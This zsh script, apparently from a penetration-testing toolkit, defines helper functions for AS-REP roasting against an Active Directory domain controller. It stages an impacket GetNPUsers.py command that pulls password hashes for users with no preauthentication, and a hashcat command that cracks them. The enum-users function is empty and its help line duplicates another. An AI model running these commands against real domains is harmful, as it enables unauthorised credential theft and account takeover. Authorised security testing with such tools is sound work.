#!/usr/bin/env zsh

############################################################# 
# nb-ad-asrep
#############################################################
nb-ad-asrep-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-asrep
------------
The nb-ad-asrep namespace contains commands for as-rep roast attack on Active Directory DC server.

Commands
--------
nb-ad-asrep-install        installs dependencies
nb-ad-asrep-enum-users     brute force a password hashes of given users
nb-ad-asrep-brute          brute force a password hashes of given users
nb-ad-asrep-crack          crack the password hash

DOC
}

nb-ad-asrep-install() {
    __info "Running $0..."
    __pkgs impacket
}

nb-ad-asrep-enum-users() {

}

nb-ad-asrep-brute() {
	__ask "Enter the IP address of the target domain controller"
	nb-vars-set-rhost
  __ask "Enter target AD domain (must also be set in your hosts file)"
  nb-vars-set-domain
	__ask "Enter a users wordlist"
	nb-vars-set-wordlist

	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}.local/ -no-pass -usersfile ${__WORDLIST}"
}

nb-ad-asrep-crack() {
	__ask "Enter the hash"
	__check-hash
	__ask "Enter a password wordlist"
	nb-vars-set-passlist

	print -z "hashcat -m 18200 -a 0 ${__HASH} ${__PASSLIST}"
}
